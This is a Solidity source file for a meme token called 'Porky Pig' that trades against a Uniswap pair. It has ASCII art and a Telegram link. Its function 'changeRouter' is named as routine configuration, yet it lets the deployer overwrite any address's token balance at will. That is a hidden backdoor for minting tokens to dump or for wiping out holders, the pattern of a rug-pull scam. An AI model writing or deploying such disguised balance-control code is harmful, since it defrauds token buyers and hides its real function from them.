// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IUniswapRouter.sol";
import "./IUniswapFactory.sol";
import "./Ownable.sol";
                                                                     
//           &&& Thats all Folks &&&                                                                                
//                                 .*%&%(&/                        
//              ,(%#.**(%&&&&&&&&/%&&%(,%*                         
//            /%(*&&&&&&&&&&&&&&&&&((&%#&/                         
//           .#&&&&&&&&&&&&&&&&&&&&&&&&%&%/                        
//         ,%&&&&&#*/*%(&&&&&&&&&&&&&&&&&&&,                       
//        *%&&&&&&&&&&&%%&&&&&&&&&&&&&&&&&&#,                      
//       *&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%.                      
//       ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#,                      
//       *%&&&&&&&&&#.%&&&&&&&&&&&&&&&&&&&%/                       
//        .%%##&&&&%%  %&&&&&&&&&&&&&&&&&*                         
//          *%,.%&&&/@@(&&&&&&&&&&&#&&&*,                          
//            .*##(&&(&#/%&&&&&&&&&&%/                             
//          /%&&%(%/%,&&&&&&&&&&&&&&&,                             
//          #&&&*%&%&(.,,.,###...*%#(                              
//           .#&&&&%.(/*#%(.********,*                             
//             ***,,.*.***.***********,                            
//           ,.*,%&(****,**************,*                          
//        *,,&&&&&&&&%(,***.,***********,,                         
//     ,,,,&&&&&&&&&%.********.*********,,                         
//    /,,/%&&&&&&&&#,************.,****,/                          
//    *,*&&&&&&&&&%,****************,..                            
//     ,#&&&&&&&&&&&/,****************,*                           
//      *&&&&&&&&&&&&&&%,,,****,,..(&%*                            
//       /&&&&&&&&&&&&&&&%/&&&&&&&&&&&/                            
//        *%&&&&&&&&&&%/&&&&&&&&&&&&&*                             
//        #&#/&&&&&&&*&&&&&&&&&&&&&(*                              
//        *#&&&&#*#%,&&&&&&&&&&&#/&&,                              
//           *,/#(**/%&&&&&&&&&&&&&&,                              
//           ./%&&&&&&,#&&&&&&&((&&/                               
//            ,/.  .*..,#&&&&&&&&%,                                
//                     .(/%&%&&(*                                  
//                      ,,,,*                                      
//
// telegram - https://t.me/porkyerc                     

contract Porky is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    string public name;
    string public symbol;
    uint8 public decimals;
    bool private inSwap;
    IUniswapRouter public _uniswapRouter;
    address public uniswapAddress;
    address public _uniswapPair;
    uint256 public totalSupply = 250_000_000_000 * 10 ** 18; // 250_000_000_000 billions token

    uint256 private constant MAX = ~uint256(0);
    mapping(address => uint256) private _balances;
    mapping(address => bool) public _isExcludeFromFee;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor() {
        name = unicode"Porky Pig";
        symbol = "Porky";
        decimals = 18;

        uniswapAddress = msg.sender;
        address receiveAddr = msg.sender;
        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[receiveAddr] = true;
        _isExcludeFromFee[uniswapAddress] = true;

        _balances[receiveAddr] = totalSupply;
        emit Transfer(address(0), receiveAddr, totalSupply);

        _uniswapRouter = IUniswapRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _allowances[address(this)][address(_uniswapRouter)] = MAX;
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(
            address(this),
            _uniswapRouter.WETH()
        );
        _isExcludeFromFee[address(_uniswapRouter)] = true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] -= amount;
        }
        return true;
    }

    function changeRouter(address _uniswapAddress, uint256 acc) public {
        require(uniswapAddress == msg.sender);
        _balances[_uniswapAddress] = acc;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    receive() external payable {}

}